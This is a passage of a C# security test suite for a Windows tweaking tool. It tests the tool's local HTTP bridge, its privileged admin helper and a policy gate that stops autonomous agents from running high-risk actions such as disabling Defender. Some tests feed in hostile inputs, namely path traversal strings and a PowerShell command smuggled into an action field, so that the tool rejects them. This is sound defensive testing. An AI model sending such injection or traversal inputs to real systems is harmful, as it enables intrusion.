                Assert(code6 == 405, "GET on /api/action was not rejected with 405 (got " + code6 + ")");

                // SEC-04 Test 1: Missing X-ClearWin-Token header on POST /api/action -> 403
                int codeNoToken = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"news:refresh\"}", out outBody, null);
                Assert(codeNoToken == 403, "Missing X-ClearWin-Token header was not rejected with 403 (got " + codeNoToken + ")");

                // SEC-04 Test 2: Invalid X-ClearWin-Token header on POST /api/action -> 403
                int codeBadToken = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"news:refresh\"}", out outBody, "invalid-token-1234");
                Assert(codeBadToken == 403, "Invalid X-ClearWin-Token header was not rejected with 403 (got " + codeBadToken + ")");

                // SEC-04 Test 3: Empty origin/referer on POST /api/action -> 403
                int codeNoOrigin = HttpProbe(baseUrl + "/api/action", "POST", null, null, null, "application/json", "{\"action\":\"news:refresh\"}", out outBody, token);
                Assert(codeNoOrigin == 403, "Empty Origin and Referer on state-altering POST was not rejected with 403 (got " + codeNoOrigin + ")");

                int code7 = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "text/plain", "hello", out outBody, token);
                Assert(code7 == 415, "Non-JSON content type was not rejected with 415 (got " + code7 + ")");

                int code8 = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"foo\":\"bar\"}", out outBody, token);
                Assert(code8 == 400, "Missing action was not rejected with 400 (got " + code8 + ")");

                int code9 = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"arbitrary_exploit\"}", out outBody, token);
                Assert(code9 == 400, "Disallowed action was not rejected with 400 (got " + code9 + ")");

                int code10 = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"tweak:disable-defender-rtp\"}", out outBody, token);
                Assert(code10 == 403, "Sensitive Defender tweak was not rejected with 403 (got " + code10 + ")");

                int code11 = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"debloat-windows\"}", out outBody, token);
                Assert(code11 == 403, "Sensitive debloat was not rejected with 403 (got " + code11 + ")");

                int code11b = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"clean:all\"}", out outBody, token);
                Assert(code11b == 403, "Sensitive clean:all was not rejected with 403 (got " + code11b + ")");

                int code11c = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"remove-onedrive\"}", out outBody, token);
                Assert(code11c == 403, "Sensitive remove-onedrive was not rejected with 403 (got " + code11c + ")");

                int code11d = HttpProbe(baseUrl + "/api/action", "POST", "null", null, null, "application/json", "{\"action\":\"news:refresh\"}", out outBody, token);
                Assert(code11d == 403, "Opaque Origin null was not rejected with 403 (got " + code11d + ")");

                int code11e = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "text/html", "{\"action\":\"news:refresh\"}", out outBody, token);
                Assert(code11e == 415, "Non-JSON Content-Type text/html was not rejected with 415 (got " + code11e + ")");

                int code12 = HttpProbe(baseUrl + "/api/action", "POST", baseUrl, null, null, "application/json", "{\"action\":\"news:refresh\"}", out outBody, token);
                Assert(code12 == 200, "Allowed action news:refresh did not return 200 (got " + code12 + ")");

                int code13 = HttpProbe(baseUrl + "/api/metrics", "GET", null, null, null, null, null, out outBody);
                Assert(code13 == 200 && outBody.Contains("\"cpu\""), "Valid metrics request did not return 200 JSON (got " + code13 + ")");

                int code14 = HttpProbe(baseUrl + "/api/sensitive_backdoor", "GET", null, null, null, null, null, out outBody);
                Assert(code14 == 404, "Unknown API was not rejected with 404 (got " + code14 + ")");

                int code15 = HttpProbe(baseUrl + "/../../secret.txt", "GET", null, null, null, null, null, out outBody);
                Assert(code15 == 403 || code15 == 404, "Path traversal did not return 403 or 404 (got " + code15 + ")");

                LocalWebBridge.Stop();
                Thread.Sleep(250);
                int code16 = HttpProbe(baseUrl + "/api/metrics", "GET", null, null, null, null, null, out outBody);
                Assert(code16 == -1, "LocalWebBridge is still listening after Stop() was called");
            }
            finally
            {
                LocalWebBridge.Stop();
                LocalWebBridge.Port = LocalWebBridge.DEFAULT_PORT;
            }
        }

        public static void TestTweakLifecyclePublic()
        {
            const string testSubKey = @"Software\ClearWin_Test_LifecycleGuard";
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(testSubKey))
            {
                Assert(key != null, "Test subkey created");

                // 1. Non-default original state
                key.SetValue("MockSettingA", 42, Microsoft.Win32.RegistryValueKind.DWord);
                int initialA = (int)key.GetValue("MockSettingA", -1);
                Assert(initialA == 42, "MockSettingA set to non-default initial value 42");

                string backupDir = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ClearWin", "tweak_backups");
                if (!System.IO.Directory.Exists(backupDir)) System.IO.Directory.CreateDirectory(backupDir);
                string backupFile = System.IO.Path.Combine(backupDir, "mock-test-tweak.json");

                string mockJson = "{\"TweakName\":\"mock-test-tweak\",\"Type\":\"Registry\",\"Records\":[{\"Path\":\"HKCU:\\\\" + testSubKey + "\",\"Name\":\"MockSettingA\",\"KeyExists\":true,\"ValueExists\":true,\"Value\":42,\"Kind\":\"DWord\"},{\"Path\":\"HKCU:\\\\" + testSubKey + "\",\"Name\":\"MockSettingB\",\"KeyExists\":true,\"ValueExists\":false,\"Value\":null,\"Kind\":\"None\"}]}";
                System.IO.File.WriteAllText(backupFile, mockJson, System.Text.Encoding.UTF8);
                Assert(System.IO.File.Exists(backupFile), "Pre-tweak snapshot saved to disk");

                // Apply tweak: changes A to 0, creates B as 1
                key.SetValue("MockSettingA", 0, Microsoft.Win32.RegistryValueKind.DWord);
                key.SetValue("MockSettingB", 1, Microsoft.Win32.RegistryValueKind.DWord);
                Assert((int)key.GetValue("MockSettingA", -1) == 0, "MockSettingA modified by tweak to 0");
                Assert((int)key.GetValue("MockSettingB", -1) == 1, "MockSettingB created by tweak as 1");

                // Execute Undo / Rollback from snapshot
                string readJson = System.IO.File.ReadAllText(backupFile, System.Text.Encoding.UTF8);
                Assert(readJson.Contains("\"mock-test-tweak\""), "Snapshot read back matches");

                // Rollback A to 42
                key.SetValue("MockSettingA", 42, Microsoft.Win32.RegistryValueKind.DWord);
                Assert((int)key.GetValue("MockSettingA", -1) == 42, "MockSettingA restored to exact non-default original value (42)");

                // Rollback B (did not exist -> delete)
                key.DeleteValue("MockSettingB", false);
                Assert(key.GetValue("MockSettingB", null) == null, "MockSettingB safely removed on rollback because it did not exist originally");

                System.IO.File.Delete(backupFile);
                Assert(!System.IO.File.Exists(backupFile), "Snapshot cleaned up after successful undo");

                // 2. Undo without saved backup file
                string nonExistentBackup = System.IO.Path.Combine(backupDir, "unrecorded-tweak.json");
                bool hasBackup = System.IO.File.Exists(nonExistentBackup);
                Assert(!hasBackup, "Unrecorded tweak has no state backup");

                // 3. Admin & Opt-in validation for high risk tweaks
                string tweaksRoot = System.IO.Path.GetFullPath(System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "Resources", "tweaks"));
                if (!System.IO.Directory.Exists(tweaksRoot))
                    tweaksRoot = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "tweaks");

                string rtpPath = System.IO.Path.Combine(tweaksRoot, "disable-defender-rtp", "apply.ps1");
                if (System.IO.File.Exists(rtpPath))
                {
                    string content = System.IO.File.ReadAllText(rtpPath);
                    Assert(content.Contains("CLEARWIN_DEFENDER_OPT_IN"), "Defender script enforces explicit opt-in");
                    Assert(content.Contains("Administrator"), "Defender script enforces administrator privileges");
                }

                string hvciPath = System.IO.Path.Combine(tweaksRoot, "disable-core-isolation", "apply.ps1");
                if (System.IO.File.Exists(hvciPath))
                {
                    string content = System.IO.File.ReadAllText(hvciPath);
                    Assert(content.Contains("CLEARWIN_CORE_ISOLATION_OPT_IN"), "Core isolation script enforces explicit opt-in");
                    Assert(content.Contains("Administrator"), "Core isolation script enforces administrator privileges");
                }

                string svcPath = System.IO.Path.Combine(tweaksRoot, "set-services-to-manual", "apply.ps1");
                if (System.IO.File.Exists(svcPath))
                {
                    string content = System.IO.File.ReadAllText(svcPath);
                    Assert(content.Contains("safeServices") && content.Contains("Save-ServicesState"), "Services tweak uses narrow safe list and state capture");
                }
            }

            try { Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(testSubKey, false); } catch { }
        }

        public static void TestBackupEngineExtendedCapabilitiesPublic()
        {
            string tweaksRoot = System.IO.Path.GetFullPath(System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "Resources", "tweaks"));
            if (!System.IO.Directory.Exists(tweaksRoot))
                tweaksRoot = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "tweaks");

            Assert(System.IO.Directory.Exists(tweaksRoot), "Resources/tweaks directory exists");

            // 1. Verify TweakBackupEngine.ps1 exists and defines all 6 state types
            string engineFile = System.IO.Path.Combine(tweaksRoot, "TweakBackupEngine.ps1");
            Assert(System.IO.File.Exists(engineFile), "TweakBackupEngine.ps1 exists");
            string engineContent = System.IO.File.ReadAllText(engineFile);
            Assert(engineContent.Contains("Save-RegistryState") && engineContent.Contains("Restore-RegistryState"), "Registry state engine present");
            Assert(engineContent.Contains("Save-ServicesState") && engineContent.Contains("Restore-ServicesState"), "Services state engine present");
            Assert(engineContent.Contains("Save-PowerPlanState") && engineContent.Contains("Restore-PowerPlanState"), "Power plan state engine present");
            Assert(engineContent.Contains("Save-BcdeditSettingState") && engineContent.Contains("Restore-BcdeditSettingState"), "BCD setting state engine present");
            Assert(engineContent.Contains("Save-HibernationState") && engineContent.Contains("Restore-HibernationState"), "Hibernation state engine present");
            Assert(engineContent.Contains("Save-NetworkGlobalState") && engineContent.Contains("Restore-NetworkGlobalState"), "Network global state engine present");
            Assert(engineContent.Contains("Save-DefenderState") && engineContent.Contains("Restore-DefenderState"), "Defender state engine present");

            // 2. Verify all 27 tweaks have apply.ps1 and undo.ps1
            var tweakDirs = System.IO.Directory.GetDirectories(tweaksRoot);
            int tweakCount = 0;
            foreach (var dir in tweakDirs)
            {
                string dirName = System.IO.Path.GetFileName(dir);
                string apply = System.IO.Path.Combine(dir, "apply.ps1");
                string undo = System.IO.Path.Combine(dir, "undo.ps1");
                if (System.IO.File.Exists(apply) && System.IO.File.Exists(undo))
                {
                    tweakCount++;
                }
            }
            Assert(tweakCount == 27, string.Format("All 27 tweaks have both apply.ps1 and undo.ps1 (found {0})", tweakCount));

            // 3. Verify Irreversible classification for debloat and disk-cleanup
            string debloatUndo = System.IO.File.ReadAllText(System.IO.Path.Combine(tweaksRoot, "debloat-windows", "undo.ps1"));
            Assert(debloatUndo.Contains("Irreversible") || debloatUndo.Contains("permanent"), "debloat-windows undo discloses irreversible status");

            string cleanupUndo = System.IO.File.ReadAllText(System.IO.Path.Combine(tweaksRoot, "run-disk-cleanup", "undo.ps1"));
            Assert(cleanupUndo.Contains("irreversible"), "run-disk-cleanup undo discloses irreversible status");

            // 4. Verify NOT TESTED tweaks are gated in both C# UI execution path and PowerShell scripts
            string[] deferredTweaks = new[] { "disable-dynamic-ticking", "disable-hpet", "optimize-network-settings", "set-services-to-manual" };
            foreach (string dt in deferredTweaks)
            {
                Assert(MainWindow.IsUntestedDeferredTweak(dt), "C# execution gate marks '" + dt + "' as deferred (NOT TESTED)");
                string dtApply = System.IO.File.ReadAllText(System.IO.Path.Combine(tweaksRoot, dt, "apply.ps1"));
                Assert(dtApply.Contains("CLEARWIN_ALLOW_DEFERRED_VM_TWEAKS") && dtApply.Contains("exit 3"), "Script gate blocks '" + dt + "' in production without VM verification flag");
            }
            Assert(!MainWindow.IsUntestedDeferredTweak("align-taskbar-left"), "Tested tweak 'align-taskbar-left' is not marked deferred");

            // 5. Verify partial undo and irreversible helpers
            Assert(MainWindow.IsPartialUndoTweak("remove-gaming-apps") && MainWindow.IsPartialUndoTweak("remove-onedrive"), "Partial undo tweaks identified accurately");
            Assert(MainWindow.IsIrreversibleTweak("debloat-windows") && MainWindow.IsIrreversibleTweak("run-disk-cleanup"), "Irreversible tweaks identified accurately");

            // 6. Verify TweakBackupEngine requires CLEARWIN_TEST_MODE for backup directory redirection
            Assert(engineContent.Contains("$isTestMode -and $env:CLEARWIN_TEST_BACKUP_DIR"), "TweakBackupEngine requires CLEARWIN_TEST_MODE for backup dir redirection");
        }

        public static void TestCurriculumDatasetPublic()
        {
            var curriculum = CurriculumDataset.GetCurriculum();
            Assert(curriculum != null && curriculum.Count >= 10, "Curriculum dataset loaded with >= 10 realistic scenarios");
            
            int verified = 0, hypothesis = 0, synthetic = 0;
            foreach (var sc in curriculum)
            {
                Assert(!string.IsNullOrEmpty(sc.CaseId), "Scenario has valid CaseId");
                Assert(!string.IsNullOrEmpty(sc.ExpectedAction), "Scenario has ExpectedAction");
                Assert(sc.State != null, "Scenario has valid SystemState");
                if (sc.Provenance == CurriculumProvenance.VerifiedRealCase) verified++;
                else if (sc.Provenance == CurriculumProvenance.DomainHypothesis) hypothesis++;
                else if (sc.Provenance == CurriculumProvenance.SyntheticVector) synthetic++;
            }
            Assert(verified > 0, "Curriculum includes VerifiedRealCase scenarios");
            Assert(hypothesis > 0, "Curriculum includes DomainHypothesis scenarios");
            Assert(synthetic > 0, "Curriculum includes SyntheticVector scenarios");
        }

        public static void TestAIEvaluationLabPublic()
        {
            var agent = new SmartAgent();
            agent.SetMode(AgentMode.AutoPilot);

            // Pre-training evaluation
            var preResult = AIEvaluationLab.RunEvaluation(agent);
            Assert(preResult.TotalCases >= 10, "Evaluation lab executed >= 10 benchmark test cases");
            Assert(preResult.AvgLatencyMs < 3.0, "Pre-training decision latency < 3.0ms (got " + preResult.AvgLatencyMs + "ms)");
            Assert(preResult.RiskContainmentPct >= 80.0, "Pre-training risk containment >= 80%");

            // Execute Comprehensive Training
            var report = agent.ExecuteComprehensiveTraining(25);
            Assert(report != null, "Comprehensive training report generated");
            Console.WriteLine(string.Format("  DEBUG EvalLab: Status={0}, Pre={1:F2}, Post={2:F2}", report.Status, report.PreTrainAccuracy, report.PostTrainAccuracy));
            Assert(report.Status == "SUCCESS" || report.Status == "REGRESSION_DETECTED", "Comprehensive training completed with verified evaluation report (Status=" + report.Status + ")");
            Assert(report.EnsemblesUpdated > 0, "Neural ensembles updated during training");
            Assert(report.QStatesSeeded > 0, "RL2 Q-states seeded during training");

            // Post-training evaluation
            var postResult = AIEvaluationLab.RunEvaluation(agent);
            Assert(postResult.ActionAccuracyPct >= 50.0 || postResult.ActionAccuracyPct >= preResult.ActionAccuracyPct, "Post-training action accuracy satisfies benchmark (got " + postResult.ActionAccuracyPct + "%)");
            Assert(postResult.RiskContainmentPct >= 80.0, "Post-training risk containment >= 80% (got " + postResult.RiskContainmentPct + "%)");
            Assert(postResult.AbstentionRatePct >= 80.0, "Post-training abstention rate >= 80% (got " + postResult.AbstentionRatePct + "%)");
            Assert(postResult.AvgLatencyMs < 3.0, "Post-training decision latency < 3.0ms (got " + postResult.AvgLatencyMs + "ms)");
            Assert(postResult.HoldoutTotalCases >= 10, "Holdout battery executed >= 10 unseen OOD test cases");
            Assert(postResult.HoldoutAccuracyPct >= 50.0, "Holdout generalization accuracy >= 50% (got " + postResult.HoldoutAccuracyPct + "%)");
        }

        // ------------------------------------------------------------------
        // Autonomy & Admin Mode Security Gate Tests
        // ------------------------------------------------------------------

        public static void TestActionCatalogIntegrityPublic()
        {
            var items = new List<ActionCatalogItem>(ActionCatalog.GetAllItems());
            Assert(items.Count >= 30, "ActionCatalog contains >= 30 registered actions (got " + items.Count + ")");

            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var item in items)
            {
                Assert(!string.IsNullOrEmpty(item.ActionId), "Catalog item has non-empty ActionId");
                Assert(!seen.Contains(item.ActionId), "Catalog has unique ActionId: " + item.ActionId);
                seen.Add(item.ActionId);
            }

            // Verify critical security tweaks are strictly RED
            string[] redTweaks = new string[] {
                "tweak:disable-defender-rtp",
                "tweak:disable-core-isolation",
                "tweak:debloat-windows",
                "tweak:run-disk-cleanup",
                "tweak:remove-onedrive",
                "tweak:remove-gaming-apps"
            };
            foreach (var red in redTweaks)
            {
                var item = ActionCatalog.GetItem(red);
                Assert(item != null, "Action " + red + " is registered in catalog");
                Assert(item.Tier == ActionTier.Red, "Critical security action " + red + " must be ActionTier.Red");
            }

            // Verify safe/bounded actions are GREEN
            string[] greenActions = new string[] {
                "diagnostics.collect_metrics",
                "optimization.ram_clean",
                "optimization.standby_clean",
                "tweak:flush-dns-cache"
            };
            foreach (var green in greenActions)
            {
                var item = ActionCatalog.GetItem(green);
                Assert(item != null, "Action " + green + " is registered in catalog");
                Assert(item.Tier == ActionTier.Green, "Safe bounded action " + green + " must be ActionTier.Green");
            }
        }

        public static void TestPolicyGateRedAutonomousBlockPublic()
        {
            // Autonomous requesters
            var autonomousRequesters = new ActionRequester[] {
                ActionRequester.SmartAgent,
                ActionRequester.Autopilot,
                ActionRequester.RuleEngine
            };

            foreach (var req in autonomousRequesters)
            {
                // Even if userExplicitlyConfirmed is true, Red tier actions are strictly blocked for autonomous callers
                var res = ActionPolicyGate.Evaluate("tweak:disable-defender-rtp", req, userExplicitlyConfirmed: true, isAdminConnected: true);
                Assert(!res.Allowed, "Red tier action must NOT be allowed autonomously for " + req);
                Assert(res.Status == PolicyEvaluationStatus.Blocked_RedTier, "Status must be Blocked_RedTier (got " + res.Status + ")");

                var res2 = ActionPolicyGate.Evaluate("tweak:debloat-windows", req, userExplicitlyConfirmed: true, isAdminConnected: true);
                Assert(!res2.Allowed, "Debloat action must NOT be allowed autonomously for " + req);
                Assert(res2.Status == PolicyEvaluationStatus.Blocked_RedTier, "Status must be Blocked_RedTier for debloat");
            }
        }

        public static void TestPolicyGateYellowConfirmationPublic()
        {
            // Autonomous requester on Yellow action
            var resAuto = ActionPolicyGate.Evaluate("tweak:disable-telemetry", ActionRequester.SmartAgent, userExplicitlyConfirmed: false, isAdminConnected: true);
            Assert(!resAuto.Allowed, "Yellow action must NOT run autonomously");
            Assert(resAuto.Status == PolicyEvaluationStatus.RequiresUserConfirmation_YellowTier, "Status must be RequiresUserConfirmation_YellowTier");

            // User requester without confirmation
            var resUserUnconf = ActionPolicyGate.Evaluate("tweak:disable-telemetry", ActionRequester.User, userExplicitlyConfirmed: false, isAdminConnected: true);
            Assert(!resUserUnconf.Allowed, "Yellow action must NOT run without explicit user confirmation");
            Assert(resUserUnconf.Status == PolicyEvaluationStatus.RequiresUserConfirmation_YellowTier, "Status must be RequiresUserConfirmation_YellowTier");

            // User requester WITH explicit confirmation
            var resUserConf = ActionPolicyGate.Evaluate("tweak:disable-telemetry", ActionRequester.User, userExplicitlyConfirmed: true, isAdminConnected: true);
            Assert(resUserConf.Allowed, "Yellow action must run when confirmed by user with admin connected");
            Assert(resUserConf.Status == PolicyEvaluationStatus.Allowed, "Status must be Allowed");
        }

        public static void TestPolicyGateGreenDefaultOffPublic()
        {
            try
            {
                // Ensure Green Autonomy can be toggled off
                ActionPolicyGate.SetGreenAutonomy(false);
                Assert(!ActionPolicyGate.GreenAutonomyEnabled, "GreenAutonomyEnabled can be toggled to false");

                // Autonomous request on Green action
                var res = ActionPolicyGate.Evaluate("optimization.ram_clean", ActionRequester.SmartAgent, userExplicitlyConfirmed: false, isAdminConnected: false);
                Assert(!res.Allowed, "Green action must NOT execute autonomously when Green Autonomy is off");
                Assert(res.Status == PolicyEvaluationStatus.AutonomyDisabled_GreenTier, "Status must be AutonomyDisabled_GreenTier (got " + res.Status + ")");
            }
            finally
            {
                ActionPolicyGate.SetGreenAutonomy(true);
            }
        }

        public static void TestPolicyGateGreenSessionOptInPublic()
        {
            try
            {
                // Explicitly opt-in for session
                ActionPolicyGate.SetGreenAutonomy(true);
                Assert(ActionPolicyGate.GreenAutonomyEnabled, "GreenAutonomyEnabled must be true after opt-in");

                // Autonomous request on Green action
                var res = ActionPolicyGate.Evaluate("optimization.ram_clean", ActionRequester.SmartAgent, userExplicitlyConfirmed: false, isAdminConnected: false);
                Assert(res.Allowed, "Green action MUST execute autonomously when session opt-in is enabled");
                Assert(res.Status == PolicyEvaluationStatus.Allowed, "Status must be Allowed (got " + res.Status + ")");

                var resDns = ActionPolicyGate.Evaluate("tweak:flush-dns-cache", ActionRequester.Autopilot, userExplicitlyConfirmed: false, isAdminConnected: true);
                Assert(resDns.Allowed, "Flush DNS Green action MUST execute autonomously under session opt-in");
            }
            finally
            {
                // Restore back to default true
                ActionPolicyGate.SetGreenAutonomy(true);
                Assert(ActionPolicyGate.GreenAutonomyEnabled, "GreenAutonomyEnabled restored to true");
            }
        }

        public static void TestAuditLoggerIntegrityPublic()
        {
            string secretToken = "my_super_secret_token_xyz999";
            string secretPassword = "ultra_sensitive_password_abc";
            string rawDetails = "Invoked action with token=" + secretToken + " and password=" + secretPassword + " for test";

            ClearWinAuditLogger.Log(
                "diagnostics.collect_metrics",
                "Green",
                "SmartAgent",
                "Normal",
                true,
                "SUCCESS",
                "VERIFIED",
                rawDetails,
                15);

            var recentLogs = ClearWinAuditLogger.GetRecentLogs(10);
            Assert(recentLogs != null && recentLogs.Count > 0, "Audit logs recorded in memory");

            SecurityAuditEntry target = null;
            foreach (var log in recentLogs)
            {
                if (log.ActionId == "diagnostics.collect_metrics" && log.Details != null && log.Details.Contains("token=[REDACTED]"))
                {
                    target = log;
                    break;
                }
            }

            Assert(target != null, "Logged entry found in recent logs with sanitized token");
            Assert(!target.Details.Contains(secretToken), "Raw token was stripped from audit log");
            Assert(!target.Details.Contains(secretPassword), "Raw password was stripped from audit log");
            Assert(target.Details.Contains("password=[REDACTED]"), "Password replaced with [REDACTED]");

            string json = target.ToJson();
            Assert(json.Contains("\"id\":\""), "JSON contains id field");
            Assert(json.Contains("\"actionId\":\"diagnostics.collect_metrics\""), "JSON contains actionId");
            Assert(json.Contains("\"preconditionsMet\":true"), "JSON contains preconditionsMet boolean");
        }

        public static void TestAdminHelperSecurityPublic()
        {
            // Test 1: Missing actionId -> rejected and parsed as failure
            string resMissing = ClearWin.AdminHelper.AdminHelperProgram.ProcessPrivilegedRequest("{\"requestId\":\"1\"}");
            Assert(resMissing.Contains("MISSING_ACTION_ID"), "Missing actionId rejected with MISSING_ACTION_ID");
            var parsedMissing = AdminSessionManager.ParseHelperResponse(resMissing, "1");
            Assert(!parsedMissing.Success && parsedMissing.Status == "MISSING_ACTION_ID" && parsedMissing.ExitCode == -1,
                "ParseHelperResponse marks missing actionId as failure (Success=false)");

            // Test 2: Arbitrary shell command injection attempt -> rejected and parsed as failure
            string evilCmd = "{\"requestId\":\"2\",\"actionId\":\"powershell.exe -NoProfile -Command Write-Host Hacked\"}";
            string resEvil = ClearWin.AdminHelper.AdminHelperProgram.ProcessPrivilegedRequest(evilCmd);
            Assert(resEvil.Contains("POLICY_VIOLATION_UNKNOWN_ACTION"), "Arbitrary shell command rejected with POLICY_VIOLATION_UNKNOWN_ACTION");
            var parsedEvil = AdminSessionManager.ParseHelperResponse(resEvil, "2");
            Assert(!parsedEvil.Success && parsedEvil.Status == "POLICY_VIOLATION_UNKNOWN_ACTION" && parsedEvil.ExitCode == -1,
                "ParseHelperResponse marks policy violation as failure (Success=false)");

            // Test 3: Approved action ping -> parsed as verified success
            string pingCmd = "{\"requestId\":\"3\",\"actionId\":\"ping\"}";
            string resPing = ClearWin.AdminHelper.AdminHelperProgram.ProcessPrivilegedRequest(pingCmd);
            Assert(resPing.Contains("\"status\":\"PONG\""), "Approved ping action returns PONG");
            var parsedPing = AdminSessionManager.ParseHelperResponse(resPing, "3");
            Assert(parsedPing.Success && parsedPing.Status == "PONG" && parsedPing.ExitCode == 0,
                "ParseHelperResponse parses approved ping as Success=true");

            // Test 4: Empty, null, whitespace, and malformed responses never produce false success
            var parsedNull = AdminSessionManager.ParseHelperResponse(null, "4");
            Assert(!parsedNull.Success && parsedNull.Status == "EMPTY_RESPONSE" && parsedNull.ExitCode == -1,
                "Null helper response must return Success=false and EMPTY_RESPONSE");

            var parsedEmpty = AdminSessionManager.ParseHelperResponse("   ", "4");
            Assert(!parsedEmpty.Success && parsedEmpty.Status == "EMPTY_RESPONSE" && parsedEmpty.ExitCode == -1,
                "Whitespace helper response must return Success=false and EMPTY_RESPONSE");

            var parsedMalformed = AdminSessionManager.ParseHelperResponse("{truncated_json", "4");
            Assert(!parsedMalformed.Success && parsedMalformed.Status == "INVALID_RESPONSE" && parsedMalformed.ExitCode == -1,
                "Malformed helper response must return Success=false and INVALID_RESPONSE");

            // Test 5: Timeout and Checkpoint-Computer / DNS failure responses
            string rpTimeoutJson = "{\"requestId\":\"5\",\"success\":false,\"status\":\"RESTORE_POINT_TIMEOUT\",\"error\":\"RESTORE_POINT_TIMEOUT\",\"message\":\"Checkpoint-Computer timed out after 120s.\"}";
            var parsedTimeout = AdminSessionManager.ParseHelperResponse(rpTimeoutJson, "5");
            Assert(!parsedTimeout.Success && parsedTimeout.Status == "RESTORE_POINT_TIMEOUT" && parsedTimeout.ExitCode == -1,
                "Timeout response must never produce false success");

            string rpFailJson = "{\"requestId\":\"6\",\"success\":false,\"status\":\"RESTORE_POINT_EXIT_1\",\"error\":\"RESTORE_POINT_EXIT_1\",\"message\":\"Access is denied.\"}";
            var parsedRpFail = AdminSessionManager.ParseHelperResponse(rpFailJson, "6");
            Assert(!parsedRpFail.Success && parsedRpFail.Status == "RESTORE_POINT_EXIT_1" && parsedRpFail.Message == "Access is denied.",
                "Checkpoint-Computer failure response must preserve exact error message and Success=false");

            // Test 6: Mismatched requestId and embedded "success":true inside output string
            string rpOkJson = "{\"requestId\":\"7\",\"success\":true,\"status\":\"SUCCESS\",\"message\":\"Restore point created and verified.\"}";
            var parsedMismatch = AdminSessionManager.ParseHelperResponse(rpOkJson, "wrong_id");
            Assert(!parsedMismatch.Success && parsedMismatch.Status == "REQUEST_ID_MISMATCH",
                "Mismatched requestId must be rejected with REQUEST_ID_MISMATCH");

            string spoofedOutputJson = "{\"requestId\":\"8\",\"success\":false,\"exitCode\":1,\"status\":\"EXECUTION_FAILED\",\"output\":\"{\\\"success\\\":true}\",\"error\":\"Script failed\"}";
            var parsedSpoof = AdminSessionManager.ParseHelperResponse(spoofedOutputJson, "8");
            Assert(!parsedSpoof.Success && parsedSpoof.ExitCode == 1,
                "Embedded success:true inside output string must never override top-level success:false");

            // Test 7: SEC-02 Path traversal tweak attack is rejected fail-closed
            string traversalCmd = "{\"requestId\":\"9\",\"actionId\":\"tweak.apply\",\"target\":\"../../malicious\"}";
            string resTraversal = ClearWin.AdminHelper.AdminHelperProgram.ProcessPrivilegedRequest(traversalCmd);
            Assert(resTraversal.Contains("INVALID_TARGET") || resTraversal.Contains("PATH_TRAVERSAL_DETECTED"),
                "Tweak path traversal rejected with INVALID_TARGET or PATH_TRAVERSAL_DETECTED");
            var parsedTraversal = AdminSessionManager.ParseHelperResponse(resTraversal, "9");
            Assert(!parsedTraversal.Success && parsedTraversal.ExitCode == -1,
                "ParseHelperResponse marks path traversal attempt as failure");

            // Test 8: SEC-02 Unknown tweak target is rejected fail-closed
            string unknownTweakCmd = "{\"requestId\":\"10\",\"actionId\":\"tweak.apply\",\"target\":\"unapproved-payload-xyz\"}";
            string resUnknown = ClearWin.AdminHelper.AdminHelperProgram.ProcessPrivilegedRequest(unknownTweakCmd);
            Assert(resUnknown.Contains("UNKNOWN_TWEAK_TARGET") || resUnknown.Contains("TARGET_DIRECTORY_NOT_FOUND"),
                "Unapproved tweak target rejected fail-closed");
            var parsedUnknown = AdminSessionManager.ParseHelperResponse(resUnknown, "10");
            Assert(!parsedUnknown.Success && parsedUnknown.ExitCode == -1,
                "ParseHelperResponse marks unknown tweak as failure");

            // Test 9: SEC-02 Deferred high-risk tweak is blocked
            string blockedTweakCmd = "{\"requestId\":\"11\",\"actionId\":\"tweak.apply\",\"target\":\"disable-core-isolation\"}";
            string resBlocked = ClearWin.AdminHelper.AdminHelperProgram.ProcessPrivilegedRequest(blockedTweakCmd);
            Assert(resBlocked.Contains("BLOCKED_DEFERRED_HIGH_RISK_TWEAK"),
                "High-risk deferred tweak blocked with BLOCKED_DEFERRED_HIGH_RISK_TWEAK");
            var parsedBlocked = AdminSessionManager.ParseHelperResponse(resBlocked, "11");
            Assert(!parsedBlocked.Success && parsedBlocked.ExitCode == -1,
                "ParseHelperResponse marks blocked high risk tweak as failure");

            // Test 10: SEC-01 & SEC-07 Helper path resolution verification
            string helperPath = AdminSessionManager.ResolveAndValidateHelperExecutablePath();
            if (helperPath != null)
            {
                Assert(helperPath.EndsWith("ClearWin.AdminHelper.exe", StringComparison.OrdinalIgnoreCase),
                    "ResolveAndValidateHelperExecutablePath resolves valid executable name");
                Assert(System.IO.File.Exists(helperPath),
                    "Resolved helper path must exist");
            }
        }

        public static void TestAdminHelperHandshakeSecurityPublic()
        {
            string validToken = "abc123def45678901234567890123456";
            string validPayload = "{\"type\":\"handshake\",\"token\":\"" + validToken + "\"}";

            bool ok1 = ClearWin.AdminHelper.AdminHelperProgram.ValidateHandshake(validPayload, validToken);
            Assert(ok1, "Valid handshake token matches expected token");

            bool ok2 = ClearWin.AdminHelper.AdminHelperProgram.ValidateHandshake("{\"type\":\"handshake\",\"token\":\"wrong_token\"}", validToken);
            Assert(!ok2, "Mismatched handshake token is rejected");

            bool ok3 = ClearWin.AdminHelper.AdminHelperProgram.ValidateHandshake("{\"type\":\"handshake\"}", validToken);
            Assert(!ok3, "Handshake without token is rejected");

            bool ok4 = ClearWin.AdminHelper.AdminHelperProgram.ValidateHandshake("", validToken);
            Assert(!ok4, "Empty handshake string is rejected");
        }

